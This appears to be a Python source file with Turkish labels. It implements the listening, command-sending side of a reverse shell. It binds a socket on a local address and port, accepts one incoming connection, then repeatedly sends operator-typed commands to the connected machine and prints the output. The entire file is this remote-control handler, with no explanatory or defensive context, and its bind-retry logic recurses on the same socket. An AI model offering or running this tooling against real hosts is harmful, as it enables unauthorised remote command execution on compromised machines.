import socket

host="192.168.1.37"
port=15555
s=socket.socket() 

def bagla():
    try:
        s.bind((host,port))

        s.listen()

    except:
        print("Bağlantı hatası")
        bagla()

def kabul_et():

    print("Bağlantı bekleniyor")

    baglanti,adres=s.accept()

    print("Bağlantı gerçekleşti \nIP: ",adres[0],"\nPORT: ",adres[1])

    komut_yolla(baglanti)

    baglanti.close()

def komut_yolla(baglanti):
    while True:
        cmd=input("What's your code?")

        if cmd=="quit":
            break

        if len(cmd)>0:
            baglanti.send(cmd.encode("utf-8"))

            cevap=baglanti.recv(4096).decode("utf-8")

            print(cevap)


bagla()
kabul_et()

